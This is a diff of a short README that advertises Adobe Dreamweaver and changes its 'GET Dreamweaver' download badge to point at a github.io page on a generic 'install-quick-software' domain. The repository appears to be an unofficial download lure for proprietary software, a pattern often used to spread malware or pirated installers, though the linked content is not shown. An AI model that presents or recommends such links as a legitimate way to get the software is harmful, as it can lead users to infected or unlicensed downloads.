@@ -1,13 +1,13 @@
 # Dreamweaver – Modern Web Development and Design Platform  
 
 <div align="center">  
-<img src="https://static.vecteezy.com/system/resources/previews/066/118/547/non_2x/adobe-dreamweaver-cc-icon-app-logo-editable-transparent-background-premium-social-media-design-for-digital-download-free-png.png" alt="Adobe Dreamweaver Logo" width="500">  
+<img src="https://static.vecteezy.com/system/resources/previews/066/118/547/non_2x/adobe-dreamweaver-cc-icon-app-logo-editable-transparent-background-premium-social-media-design-for-digital-download-free-png.png" alt="Adobe Dreamweaver Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/dreamweaver">  
+<a href="https://install-quick-software.github.io/.github/dreamweaver">  
 <img src="https://img.shields.io/badge/💻_GET_Dreamweaver-green?style=for-the-badge&logo=adobe" alt="GET Dreamweaver">  
 </a>  
 </div>
